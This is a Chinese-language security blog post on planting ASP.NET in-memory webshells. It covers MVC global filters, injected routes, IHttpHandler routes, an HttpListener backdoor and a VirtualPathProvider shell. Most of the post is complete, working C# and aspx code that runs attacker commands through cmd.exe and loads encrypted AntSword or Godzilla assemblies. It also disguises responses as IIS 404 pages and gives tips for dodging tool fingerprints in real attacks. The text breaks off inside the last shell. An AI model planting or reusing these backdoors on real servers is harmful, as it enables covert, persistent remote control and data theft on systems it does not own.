#  ASP.NET 内存马与魔改蚁剑内存马回显

原创 侠盗鲁平 [ Security丨Art ](javascript:void\(0\);)

**Security丨Art** ![]()

微信号 gh_5fa7bf90b576

功能介绍 网络安全的闲篇扯淡与第Ｎ艺术的外行吐槽

____

___发表于_

收录于合集

  

## 测试环境

![]()

在此选项中选择mvc

项目入口在global.asax

![]()

### 官方文档

https://learn.microsoft.com/zh-cn/aspnet/mvc/overview/

https://learn.microsoft.com/zh-cn/previous-versions/aspnet/

## 种马方式

  * 直接上传aspx访问
  * 反序列化
  * lolbas+命令执行
  * 直接执行exe(listener)

## Framework

### filter

 **asp.net mvc下的filter内存马，必须依赖于system.web.mvc.dll这个东西，也就是只能在.net
mvc下使用，执行权限为iis用户权限**

入口点在global.asax的GlobalFilters

![]()

Filters来自GlobalFilterCollections()

  

![]()

根据官方定义和注释可以看到是一个保存了全局所有的filter集合的类

  

![]()

  

    
    
    基础：asp.net list泛型集合https://dotblogs.com.tw/CodingInInDer/2018/06/21/104609  
    

  

![]()  

GlobalFilterCollection类中包含两个Add重载方法和AddInternal，

  

![]()

  

    
    
    基础：asp.net函数重载  
    https://blog.csdn.net/qq_34573534/article/details/100135237  
    

  

在AddInternal中对filter实例的类型进行了判断，从这里就可以看到asp.net framework对filter类型的支持

  

    
    
    IActionFilter 操作筛选器  
    IAuthorizationFilter 授权筛选器（定义授权过滤器所需的方法。）  
    IExceptionFilter 异常筛选器  
    IResultFilter 结果筛选器  
    IAuthenticationFilter 身份验证筛选器（定义执行身份验证的过滤器。）这个是MVC5中新增的过滤器，目前介绍内存马的文章都比较老了，没有介绍这个过滤器  
    

  

![]()

  

![]()  

    
    
    基础：5种过滤器  
    https://kknews.cc/code/roe44v.html  
    

  

 **IAuthenticationFilter的执行顺序早于IAuthorizationFilter**

在MVC5中将认证和授权拆开IAuthenticationFilter负责认证，IAuthorizationFilter负责授权

在FilterProviderCollection.Compare中，根据order值判断filter处理顺序，order一致的情况下对比作用域Scope

  

![]()

  

    
    
    基础：asp.net的作用域  
    https://www.cnblogs.com/xiaoxiaotank/p/15622083.html  
      
      
    过滤器的作用域范围，可分为三种，从小到大是：  
      
    1.某个Controller中的某个Action上（不支持Razor Page中的处理方法）  
    2.某个Controller或Razor Page上  
    3.全局，应用到所有Controller、Action和Razor Page上  
    

  

![]()

接下来看FilterProviders.cs，这是一个全局的系统默认FilterFilter provider，为filter提供一个注册点

![]()

  

    
    
    基础：asp.net强制类型转换  
    (IFilterProvider) 是一个类型转换，将括号中的对象强制转换为 IFilterProvider 接口的实现。  
    

  

不同filter执行顺序围如下：

![]()请求通过授权过滤器、资源过滤器、模型绑定、操作过滤器、操作执行和操作结果转换、异常过滤器、结果过滤器和结果执行进行处理。返回时，请求仅由结果过滤器和资源过滤器进行处理，变成发送到客户端的响应。

根据在ControllerActionInvoke在InvokeAction中的判断顺序可看到filter执行顺序

![]()

任意web可访问目录添加aspx文件

    
    
    <%@ Page Language="C#" CodeBehind="test.aspx.cs" Inherits="WebApplication3.Models.test" %>  
    <%@ Import namespace="System.Diagnostics"%>  
    <%@ Import namespace="System.Reflection"%>  
    <%@ Import namespace="System.Web.Mvc"%>  
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">  
      
    <script runat="server">  
        public class MyAuthFilter : IAuthorizationFilter  
        {  
            public void OnAuthorization(AuthorizationContext filterContext)  
            {  
                string cmd = filterContext.HttpContext.Request.QueryString["cmd"];  
                if (cmd != null)  
                {  
                    HttpResponseBase response = filterContext.HttpContext.Response;  
                    Process p = new Process();  
                    p.StartInfo.FileName = cmd;  
                    p.StartInfo.UseShellExecute = false;  
                    p.StartInfo.RedirectStandardError = true;  
                    p.StartInfo.RedirectStandardOutput = true;  
                    p.Start();  
                    byte[] data = Encoding.UTF8.GetBytes(p.StandardError.ReadToEnd() + p.StandardOutput.ReadToEnd());  
                    response.Write(System.Text.Encoding.Default.GetString(data));  
                }  
                Console.WriteLine("auth filter inject");  
                  
            }  
        }  
    </script>  
    <%  
        GlobalFilterCollection globalFilterCollection = GlobalFilters.Filters;  
        globalFilterCollection.Add(new MyAuthFilter(),-2);  
    %>  
    <html xmlns="http://www.w3.org/1999/xhtml">  
    <head runat="server">  
        <title>Title</title>  
    </head>  
    <body>  
    <form id="HtmlForm" runat="server">  
        <div>  
              
        </div>  
    </form>  
    </body>  
    </html>  
    

配合检测工具可以看到内存马成功注入并可执行命令

  

![]()

![]()

  

![]()

调试可看到注册filter

  

![]()

也可以看到就是从上面提到的ColltrollerActionInvoker对filter进行调用

  

![]()

  

#### MVC5 新filter接口

因为上面说过IAuthenticationFilter的执行顺序早于IAuthorizationFilter，所以对内存马实现的接口进行更换

    
    
    <%@ Page Language="C#" CodeBehind="test.aspx.cs" Inherits="WebApplication3.Models.test" %>  
    <%@ Import namespace="System.Diagnostics"%>  
    <%@ Import namespace="System.Reflection"%>  
    <%@ Import namespace="System.Web.Mvc"%>  
    <%@ Import Namespace="System.Web.Mvc.Filters" %>  
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">  
      
    <script runat="server">  
        public class MyAuthFilter : IAuthenticationFilter  
        {  
            public void OnAuthentication(AuthenticationContext filterContext)  
            {  
                string cmd = filterContext.HttpContext.Request.QueryString["cmd"];  
                if (cmd != null)  
                {  
                    HttpResponseBase response = filterContext.HttpContext.Response;  
                    Process p = new Process();  
                    p.StartInfo.FileName = cmd;  
                    p.StartInfo.UseShellExecute = false;  
                    p.StartInfo.RedirectStandardError = true;  
                    p.StartInfo.RedirectStandardOutput = true;  
                    p.Start();  
                    byte[] data = Encoding.UTF8.GetBytes(p.StandardError.ReadToEnd() + p.StandardOutput.ReadToEnd());  
                    response.Write(System.Text.Encoding.Default.GetString(data));  
                }  
                Console.WriteLine("auth filter inject");  
            }  
      
            public void OnAuthenticationChallenge(AuthenticationChallengeContext filterContext)  
            {  
            }  
        }  
    </script>  
    <%  
        GlobalFilterCollection globalFilterCollection = GlobalFilters.Filters;  
        globalFilterCollection.Add(new MyAuthFilter(),-2);  
    %>  
    <html xmlns="http://www.w3.org/1999/xhtml">  
    <head runat="server">  
        <title>Title</title>  
    </head>  
    <body>  
    <form id="HtmlForm" runat="server">  
        <div>  
              
        </div>  
    </form>  
    </body>  
    </html>  
    

#### 检测手段

    
    
    https://github.com/yzddmr6/ASP.NET-Memshell-Scanner/blob/master/aspx-memshell-scanner.aspx  
    

本来看到蚁剑作者的介绍中没有聊IAuthenticationFilter过滤器，想着写的工具是不是没有对应检测手段，结果是列出所有filter手动删。。。。。

![]()

  

![]()

  

![]()

  

### route

  * 原理：动态打进去一个路由，然后映射到我们自定义的类
  * 条件：不需MVC，普通权限上传aspx可解析即可

不使用Global.asax中的
RouteConfig.RegisterRoutes作为入口的原因是因为调用System.Web.Mvc.RouteCollectionExtensions.MapRoute方法，而这个方法也是要依赖System.Web.Mvc.dll的

![]()

System.Web.Mvc.RouteCollectionExtensions.MapRoute调用Route.add方法添加RouteBase类型的Route

![]()

RouteBase是个抽象类，默认的实现为System.Web.Routing.Route

#### 派生RouteBase

##### GetRouteData

重写GetRouteData方法插入自定义逻辑并在RouteCollection中添加路由：

    
    
    <%@ Page Language="C#" CodeBehind="test.aspx.cs" Inherits="WebApplication3.Models.test" %>  
    <%@ Import namespace="System.Reflection"%>  
    <%@ Import Namespace="System.Web.Routing" %>  
    <%@ Import namespace="System.Diagnostics"%>  
    <%@ Import Namespace="System.Web.Mvc" %>  
      
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">  
      
    <script runat="server">  
      
        public class MyRoute : RouteBase  
        {  
            public override RouteData GetRouteData(HttpContextBase httpContext)  
            {  
                HttpContext context = HttpContext.Current;  
                String Payload = httpContext.Request.Form["ant"];  
                if (Payload != null)  
                {  
                    System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));  
                    assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(context);  
                    context.Response.End();  
                }  
                return null;  
            }  
      
            public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values)  
            {  
                return null;  
            }  
        }  
      
    </script>  
    <%  
        RouteCollection routes = RouteTable.Routes;  
        routes.Insert(0, (RouteBase)new MyRoute());  
    %>  
    <html xmlns="http://www.w3.org/1999/xhtml">  
    <head runat="server">  
        <title>Title</title>  
    </head>  
    <body>  
    <form id="HtmlForm" runat="server">  
        <div>  
              
        </div>  
    </form>  
    </body>  
    </html>  
    

  

![]()

  

![]()

实战中为了避免蚁剑等cn工具指纹可以把蚁剑反序列化加载payload的语句换成和filter中一样用process创建进程执行命令的payload或如（https://paper.seebug.org/1953/#0x07）改成加载我们写好的assembly，但（https://www.crisprx.top/archives/552）这篇文章复现直接在controller中写route实战完全没法用，很离谱

##### GetVirtualPath

改一下函数就行了，没什么区别

    
    
    public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values)  
            {  
                HttpContext context = HttpContext.Current;  
                String Payload = context.Request.Form["ant"];  
                if (Payload != null)  
                {  
                    System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));  
                    assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(context);  
                    context.Response.End();  
                }  
                return null;  
            }  
    

执行顺序： **GetRouteData >Controller>GetVirtualPath**

#### 添加Route类

实现IRouteHandler接口需要实现GetHttpHandler方法，需要返回一个实现了IHttpHandler的handler

##### GetHttpHandler

添加route方式略有不同

    
    
    <%@ Page Language="C#" CodeBehind="route2.aspx.cs" Inherits="WebApplication3.Models.route2" %>  
    <%@ Import Namespace="System.Web.Routing" %>  
      
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">  
      
    <script runat="server">  
        public class MyRoute :IRouteHandler  
        {  
            public IHttpHandler GetHttpHandler(RequestContext requestContext)  
            {  
                HttpContext httpContext=HttpContext.Current;  
                String payload = httpContext.Request.Form["ant"];  
                if (payload != null)  
                {  
                    System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String((payload)));  
                    assembly.CreateInstance(assembly.GetName().Name + ".Run").Equals(httpContext);  
                    httpContext.Response.End();  
                }  
                return null;  
            }  
        }  
    </script>  
    <%  
        RouteCollection routes = RouteTable.Routes;  
        Route route = new Route("test{page}", new MyRoute());   
        routes.Add(route);  
      
    %>  
    <html xmlns="http://www.w3.org/1999/xhtml">  
    <head runat="server">  
        <title>Title</title>  
    </head>  
    <body>  
    <form id="HtmlForm" runat="server">  
        <div>  
              
        </div>  
    </form>  
    </body>  
    </html>  
    

  

![]()

添加成功

![]()

##### IHttpHandler

在自定义route类中实现一个handler嵌套类，实现IHttpHandler"接口，把函数操作放到自定义handler里面，然后补充一下需要的构造函数即可，设置"IsReusable"属性以指示处理程序不可以被重复使用。`public
RequestContext RequestContext { get; private set;
}`定义了"MyHandler"类中的一个属性"RequestContext"，它是一个只读的公共属性，可以从外部读取，但只能在类的内部进行设置，即设置属性的访问器是私有的。RequestContext是一个包含有关HTTP请求的上下文信息的类。通过在"MyHandler"类中定义这个属性，可以获取请求的上下文信息,如访问请求的URL、HTTP方法、参数等信息

    
    
    <%@ Page Language="C#" CodeBehind="route2.aspx.cs" Inherits="WebApplication3.Models.route2" %>  
    <%@ Import Namespace="System.Web.Routing" %>  
      
    <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">  
      
    <script runat="server">  
        public class MyRoute :IRouteHandler  
        {  
            public IHttpHandler GetHttpHandler(RequestContext requestContext)  
            {  
                return new MyHandler(requestContext);  
            }  
            public class MyHandler:IHttpHandler  
            {  
                public RequestContext RequestContext { get; private set; }  
      
                public MyHandler(RequestContext requestContext)  
                {  
                    this.RequestContext = requestContext;  
                }  
      
                public void ProcessRequest(HttpContext context)  
                {  
                    string payload = context.Request.Form["ant"];  
                    if (payload != null)  
                    {  
                        System.Reflection.Assembly assembly = System.Reflection.Assembly.Load(Convert.FromBase64String(payload));  
                        assembly.CreateInstance(assembly.GetName().Name + ".RUN").Equals(context);  
                        context.Response.End();  
                    }  
                    context.Response.End();  
                }  
      
                public bool IsReusable  
                {  
                    get { return false; }   
                }  
            }  
        }  
    </script>  
    <%  
        RouteCollection routes = RouteTable.Routes;  
        Route route = new Route("test{page}", new MyRoute());   
        routes.Add(route);  
      
    %>  
    <html xmlns="http://www.w3.org/1999/xhtml">  
    <head runat="server">  
        <title>Title</title>  
    </head>  
    <body>  
    <form id="HtmlForm" runat="server">  
        <div>  
              
        </div>  
    </form>  
    </body>  
    </html>  
    

注入成功

![]()

### listener

#### 前置条件

  * 使用条件：system权限
  * 实现原理：本质上是重新启动了一个web程序并进行端口复用（类似于python直接起了个simpleHttp），主要用于维权，因为是攻击者启动的Server所以不会在原有的Web中留下日志

通过提取HttpListenerRequest，HttpListenerResponse的参数来构造一个我们可以用的System.Web.Request跟System.Web.Response对象，然后作为参数实例化一个System.Web.HttpContext

利用HttpContext.Current获取到当前Web的HttpContext；创建一个新的Thread，并把当前Thread的HttpContext传递过去防止进程终止

    
    
    using System.Diagnostics;  
    using System.Text;  
    using System.IO;  
    using System.Net;  
    using System.Web;  
    using System;  
    using System.Collections.Generic;  
    using System.Collections;  
    using System.Threading;  
      
      
    public class SharpMemshell  
    {  
        static void Main(string args)  
        {  
            HttpContext ctx = HttpContext.Current;  
            Thread Listen = new Thread(Listener);  
            Thread.Sleep(0);  
            Listen.Start(ctx);  
        }  
      
        public SharpMemshell() {  
            HttpContext ctx = HttpContext.Current;  
            Thread Listen = new Thread(Listener);  
            Thread.Sleep(0);  
            Listen.Start(ctx);  
        }  
      
        public static void log(string data)  
        {  
            try  
            {  
                string logfile = "c:\\log.txt";  
                if (!File.Exists(logfile))  
                {  
                    byte[] output = System.Text.Encoding.Default.GetBytes(data);  
                    FileStream fs = new FileStream(logfile, FileMode.Create);//为文件提供一个 Stream，支持同步和异步读写操作。  
                    fs.Write(output, 0, output.Length);  
                    fs.Flush();  
                    fs.Close();  
                }  
                else  
                {  
                    using (StreamWriter sw = new StreamWriter(logfile, true))  
                        /*  
                         * using语句一开始定义了一个StreamWriter的对象，  
                         * 之后在整个语句块中都可以使用sw，  
                         * 在using语句块结束的时候，sw的Dispose方法将会被自动调用  
                         *对于任何IDisposable接口的类型，都可以使用using语句  
                         *   
                         * 托管资源：由CLR管理分配和释放的资源，也就是我们直接new出来的对象；  
                         * 非托管资源：不受CLR控制的资源，也就是不属于.NET本身的功能，  
                         * 往往是通过调用跨平台程序集(如C++)或者操作系统提供的一些接口，  
                         * 比如Windows内核对象、文件操作、数据库连接、socket、Win32API、网络等。  
                         *   
                         * 假设我们要使用FileStream,使用try…catch…finally…这种做法，  
                         * 因为它的实现调用了非托管资源，所以我们必须用完之后要去显式释放它，  
                         * 如果不去释放它，那么可能就会造成内存泄漏。  
                         *  
                         * 一个标准的释放非托管资源的类应该去实现IDisposable接口  
                         * 要实现IDisposable接口，我们其实应该这样做：  
                         * 实现Dispose方法；  
                         * 提取一个受保护的Dispose虚方法，在该方法中实现具体的释放资源的逻辑；  
                         * 添加析构函数；  
                         * 添加一个私有的bool类型的字段，作为释放资源的标记  
                         */  
                    {  
                        sw.WriteLine(data);  
                    }  
                }  
            }  
            catch (Exception e)  
            {  
                Console.WriteLine("log error:\n{0}",e);  
            }  
        }  
      
        public static Dictionary<string, string> parse_post(HttpListenerRequest request)  
        {  
            var post_raw_data = new StreamReader(request.InputStream, request.ContentEncoding).ReadToEnd();//实现一个 TextReader，它以特定编码从字节流中读取字符。  
            Dictionary<string, string> postParams = new Dictionary<string, string>();  
            string[] raw_Params = post_raw_data.Split('&');  
            foreach (string param in raw_Params)  
            {  
                string[] kvPair = param.Split('=');// key-value-pair键值对  
                string p_key = kvPair[0];  
                string value = HttpUtility.UrlDecode(kvPair[1]);  
                postParams.Add(p_key,value);  
            }  
            return postParams;  
        }  
      
        public static void SetRespHeader(HttpListenerResponse resp)  
        {  
            resp.Headers.Set(HttpResponseHeader.Server, "Microsoft-IIS/8.5");  
            resp.Headers.Set(HttpResponseHeader.ContentType, "text/html; charset=utf-8");  
            resp.Headers.Add("X-Powered-By", "ASP.NET");  
        }  
      
        public static void Listener(object ctx)  
        {  
            HttpListener listener = new HttpListener();  
            try  
            {  
                if (!HttpListener.IsSupported)  
                {  
                    return;  
                }  
                string input_key = "key";  
                string pass = "pass";  
                string nodata = "PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEvL0VOIiJodHRwOi8vd3d3LnczLm9yZy9UUi9odG1sNC9zdHJpY3QuZHRkIj4NCjxIVE1MPjxIRUFEPjxUSVRMRT5Ob3QgRm91bmQ8L1RJVExFPg0KPE1FVEEgSFRUUC1FUVVJVj0iQ29udGVudC1UeXBlIiBDb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXMtYXNjaWkiPjwvSEVBRD4NCjxCT0RZPjxoMj5Ob3QgRm91bmQ8L2gyPg0KPGhyPjxwPkhUVFAgRXJyb3IgNDA0LiBUaGUgcmVxdWVzdGVkIHJlc291cmNlIGlzIG5vdCBmb3VuZC48L3A+DQo8L0JPRFk+PC9IVE1MPg0K";  
                /*  
                 * <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">  
                 * <HTML><HEAD><TITLE>Not Found</TITLE>  
                 * <META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>  
                 * <BODY><h2>Not Found</h2>  
                 * <hr><p>HTTP Error 404. The requested resource is not found.</p>  
                 * </BODY></HTML>  
                 */  
                string url = "http://*:80/favicon.ico/";  
                listener.Prefixes.Add(url);  
                listener.Start();  
      
                byte[] not_found = System.Convert.FromBase64String(nodata);  
                string key = System.BitConverter  
                    .ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(  
                        System.Text.Encoding.Default.GetBytes(input_key))).Replace("-", "").ToLower().Substring(0, 16);  
                /*  
                 * System.BitConverter.ToString将指定字节数组的每个元素的数值转换为其等效的十六进制字符串表示形式。  
                 * System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash计算输入数据的 MD5 哈希值  
                 */  
                string md5 = System.BitConverter  
                    .ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(  
                        System.Text.Encoding.Default.GetBytes(pass + key))).Replace(",", "");  
                Dictionary<string, dynamic> sessionDictionary = new Dictionary<string, dynamic>();//dynamic的对象会绕过静态类型检查  
                Hashtable sessionTable = new Hashtable();  
                while (true)  
                {  
                    HttpListenerContext context = listener.GetContext();  
                    HttpListenerRequest request = context.Request;  
                    HttpListenerResponse response = context.Response;  
                    SetRespHeader(response);  
                    Stream stm = null;  
                    HttpContext httpContext;  
                    try  
                    {  
                        if (ctx != null)  
                        {  
                            httpContext = ctx as HttpContext; //传入的ctx为HttpContext类型  
                        }  
                        else  
                        {  
                            HttpRequest req = new HttpRequest("", request.Url.ToString(), request.QueryString.ToString());  
                            System.IO.StreamWriter writer = new StreamWriter(response.OutputStream);  
                            HttpResponse resp = new HttpResponse(writer);  
                            httpContext = new HttpContext(req, resp);  
                        }  
      
                        var method = request.Headers["Type"];  
                        if (method == "print")  
                        {  
                            byte[] output = Encoding.Default.GetBytes("OK");  
                            response.StatusCode = 200;  
                            response.ContentLength64 = output.Length;  
                            stm = response.OutputStream;  
                            stm.Write(output,0,output.Length);  
                            stm.Close();  
                        }  
                        else if(method=="cmd"&&request.HttpMethod=="POST")  
                        {  
                            Dictionary<string, string> postParams = parse_post(request);  
                            Process p = new Process();  
                            p.StartInfo.FileName = "cmd.exe";  
                            p.StartInfo.Arguments = "/c " + postParams[pass];  
                            p.StartInfo.UseShellExecute = false;  
                            p.StartInfo.RedirectStandardOutput = true;  
                            p.StartInfo.RedirectStandardError = true;  
                            p.Start();  
                            byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());  
                            response.StatusCode = 200;  
                            response.ContentLength64 = data.Length;  
                            stm = response.OutputStream;  
                            stm.Write(data, 0, data.Length);  
                        }else if (method=="mem_b64"&& request.HttpMethod=="POST")  
                        {  
                            Dictionary<string, string> postParams = parse_post(request);  
                            byte[] data = System.Convert.FromBase64String(postParams[pass]);  
                            data = new System.Security.Cryptography.RijndaelManaged()  
                                .CreateDecryptor(System.Text.Encoding.Default.GetBytes(key),  
                                    System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length);  
                            /*  
                             *System.Security.Cryptography.RijndaelManaged().CreateDecryptor  
                             * 使用指定的密钥和初始化向量 (IV) 创建一个对称的 Rijndael 解密器对象。  
                             * Rijndael（发音为 rain-dahl）是一种高级加密标准 (AES) 算法。  
                             * TransformFinalBlock计算指定字节数组的指定区域的转换。  
                             */  
                            Cookie sessionCookie = request.Cookies["ASP.NET_SessionId"];  
                            if (sessionCookie == null)  
                            {  
                                Guid sessionId = Guid.NewGuid();  
                                var payload = (System.Reflection.Assembly)typeof(System.Reflection.Assembly)  
                                    .GetMethod("Load", new System.Type[] { typeof(byte[]) })  
                                    .Invoke(null, new object[] { data });  
                                /*  
                                 *通过从字节数组加载程序集来创建 System.Reflection.Assembly 类的实例  
                                 * 了能够使用反射，需要在项目中引用 System.Reflection 命名空间  
                                 * 在使用反射的开始，你会获取一个 Type 类型的对象，从这个对象上进一步获取 程序集，类型，模块 等信息  
                                 *   
                                 * typeof(System.Reflection.Assembly) 获取 System.Reflection.Assembly type对象  
                                 * 在 System.Reflection.Assembly 类型上调用 GetMethod(“Load”, new System.Type[] { typeof(byte[]) }) 方法  
                                 * 以获取对其采用字节数组参数的 Load 方法的引用。  
                                 * Invoke(null, new object[] { data })  
                                 * 用于以空对象引用作为其对象实例参数并以字节数组数据作为其参数值来调用 Load 方法。  
                                 * 这从字节数组加载程序集并返回 System.Reflection.Assembly 类的一个实例，  
                                 * 该实例分配给 payload 变量  
                                 */  
                                sessionDictionary.Add(sessionId.ToString(),payload);  
                                response.SetCookie(new Cookie("ASP.NET_SessionId", sessionId.ToString()));  
                                byte[] output = Encoding.Default.GetBytes("");  
                                response.StatusCode = 200;  
                                response.ContentLength64 = output.Length;  
                                stm = response.OutputStream;  
                                stm.Write(output,0,output.Length);  
                            }  
                            else  
                            {  
                                dynamic payload = sessionDictionary[sessionCookie.Value];  
                                MemoryStream outStream = new MemoryStream();  
                                object o = ((System.Reflection.Assembly)payload).CreateInstance("LY");  
                                o.Equals(outStream);  
                                o.Equals(httpContext);  
                                o.Equals(data);  
                                o.ToString();  
                                byte[] r = outStream.ToArray();  
                                outStream.Dispose();  
                                response.StatusCode = 200;  
                                string new_data = md5.Substring(0, 16) + System.Convert.ToBase64String(  
                                    new System.Security.Cryptography.RijndaelManaged()  
                                        .CreateEncryptor(System.Text.Encoding.Default.GetBytes(key),  
                                            System.Text.Encoding.Default.GetBytes(key))  
                                        .TransformFinalBlock(r, 0, r.Length)) + md5.Substring(16);  
                                byte[] new_data_bytes = Encoding.ASCII.GetBytes(new_data);  
                                response.ContentLength64 = new_data_bytes.Length;  
                                stm = response.OutputStream;  
                                stm.Write(new_data_bytes, 0, new_data_bytes.Length);  
      
      
                            }  
                              
                        } else if (method == "mem_raw" && request.HttpMethod == "POST" && request.HasEntityBody)  
                        {  
                            int contentLength = int.Parse(request.Headers.Get("Content-Length"));  
                            byte[] array = new byte[contentLength];  
                            request.InputStream.Read(array, 0, contentLength);  
                            byte[] data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(array, 0, array.Length);  
                            if (sessionTable["payload"] == null)  
                            {  
                                sessionTable["payload"] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod("Load", new System.Type[] { typeof(byte[]) }).Invoke(null, new object[] { data });  
                            }  
                            else  
                            {  
                                object o = ((System.Reflection.Assembly)sessionTable["payload"]).CreateInstance("LY");  
                                System.IO.MemoryStream outStream = new System.IO.MemoryStream();  
                                o.Equals(outStream);  
                                o.Equals(httpContext);  
                                /*  
                                 * Godzilla重写了Equals  
                                 * this.httpContext = (HttpContext)obj;  
                                 * this.httpRequest = this.httpContext.Request;  
                                 * this.httpResponse = this.httpContext.Response;  
                                 * result = true;  
                                 */  
                                o.Equals(data);  
                                o.ToString();  
                                byte[] r = outStream.ToArray();  
                                outStream.Dispose();  
                                if (r.Length > 0)  
                                {  
                                    r = new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length);  
                                    response.StatusCode = 200;  
                                    stm = response.OutputStream;  
                                    response.ContentLength64 = r.Length;  
                                    stm.Write(r, 0, r.Length);  
                                }  
                            }  
                        }  
                        else  
                        {  
                            response.StatusCode = 404;  
                            response.ContentLength64 = not_found.Length;  
                            stm = response.OutputStream;  
                            stm.Write(not_found, 0, not_found.Length);  
                        }  
                    }  
                    catch (Exception e)  
                    {  
                        response.StatusCode = 404;  
                        response.ContentLength64 = not_found.Length;  
                        stm = response.OutputStream;  
                        stm.Write(not_found, 0, not_found.Length);  
                        Console.WriteLine("Exception caught1: " + e.ToString());  
                        //log("Exception caught1: " + e.ToString());  
                    }  
                    finally  
                    {  
                        if (stm != null)  
                        {  
                            stm.Flush();  
                            stm.Close();  
                        }  
                        response.OutputStream.Flush();  
                        response.OutputStream.Close();  
                    }  
                }  
            }  
            catch (Exception e)  
            {  
                Console.WriteLine("Exception caught2: " + e.ToString());  
                //log("Exception caught2: "+ e.ToString());  
                if (listener.IsListening)  
                {  
                    listener.Stop();  
                }  
            }  
        }  
    }  
    

  

执行cmd，启动一个process执行cmd命令

  

![]()

加载assmbly，base64解码后，用key进行aes解密然后反序列化加载payload，将结果夹杂在一段md5的16位中介返回

  

![]()

#### 使用方法

listener内存马就是一个起了http服务的exe或者dll，但是因为需要system权限所以很难用

  * 执行exe

  * 利用GadgetToJScript

  * 利用aspx加载dll

  * 利用反序列化漏洞加载dll

详细命令在https://mp.weixin.qq.com/s/zsPPkhCZ8mhiFZ8sAohw6w及https://github.com/A-D-
Team/SharpMemshell/tree/main/HttpListener

访问http://127.0.0.1/favicon.ico/启动成功

![]()

  

![]()

  

### virtualPath

哥斯拉virtualPath内存马

    
    
    哥斯拉virtualPath内存马  
      
    https://github.com/A-D-Team/SharpMemshell/blob/69ab8cff53689e53076b534537d384b3169be0cb/VirtualPath/memshell.cs#L146  
    

`VirtualPathProvider类提供一组方法，用于实现 Web
应用程序的虚拟文件系统。在虚拟文件系统中，文件和目录由服务器操作系统提供的文件系统外的其他数据存储管理。例如，可以使用虚拟文件系统将内容存储在SQL
Server数据库中。  
`

virtualPath内存马就是映射一个物理上不存在的ASP.NET页到URL中

写virtualPath内存马：

  * 自定义一个类继承虚拟文件对象VirtualFile类，并且重写Open方法，该方法原本是读取数据库里的文件源码内容，但星主在该方法里替换成启动cmd进程的代码，访问/myvirtualfile.aspx 触发启动新进程

  * VirtualPathProvider提供给web应用检索自定义的VirtualFile，所以需要重写该类的GetFile方法，并实例化自定义的VirtualFile

  * 在global.asax全局文件的Application_Start方法里通过HostingEnvironment类注册这个自定义的实例

  * 访问/myvirtualfile.aspx?cmd=whoami，得到了执行的结果

    
    
    <%@ Import Namespace="System.Diagnostics" %>  
    <%@ Import Namespace="System.IO" %>  
    <%@ Import Namespace="System.Web.Hosting" %>  
    <script runat="server" language="c#">  
        public void Page_load()  
        {  
            HostingEnvironment.RegisterVirtualPathProvider(new MyVirtualPathProvider());  
              
        }  
        public class MyVirtualPathProvider : VirtualPathProvider  
        {  
      
            public override bool FileExists(string virtualPath)  
            {  
                virtualPath = virtualPath.ToLower();  
      
                if (virtualPath.Contains("godshell"))  
                {  
                    return true;  
                }  
                else  
                {  
                    return Previous.FileExists(virtualPath);  
                }  
                //return base.FileExists(virtualPath);  
            }  
      
            public override VirtualFile GetFile(string virtualPath)  
            {  
                virtualPath = virtualPath.ToLower();  
      
                if (virtualPath.Contains("godshell"))  
                {  
                    return new MyVirtualFile(virtualPath);  
                }  
                else  
                {  
                    return Previous.GetFile(virtualPath);  
                }  
                //return base.GetFile(virtualPath);  
            }  
      
      
        }  
      
      
        public class MyVirtualFile : VirtualFile  
        {  
            private string myPath;  
      
            public MyVirtualFile(string virtualPath)  
                : base(virtualPath)  
            {  
                myPath = virtualPath;  
            }  
      
            public override Stream Open()  
            {  
                Stream stream = new MemoryStream();  
                if (myPath.Contains("godshell"))  
                {  
                    String cmd = System.Web.HttpContext.Current.Request.QueryString["cmd"];  
                    if (cmd != null)  
                    {  
                        Process p = new Process();  
                        p.StartInfo.FileName = "cmd.exe";  
                        p.StartInfo.Arguments = "/c " + cmd;  
                        p.StartInfo.UseShellExecute = false;  
                        p.StartInfo.RedirectStandardOutput = true;  
                        p.StartInfo.RedirectStandardError = true;  
                        p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;  
                        p.Start();  
                        byte[] data = Encoding.Default.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());  
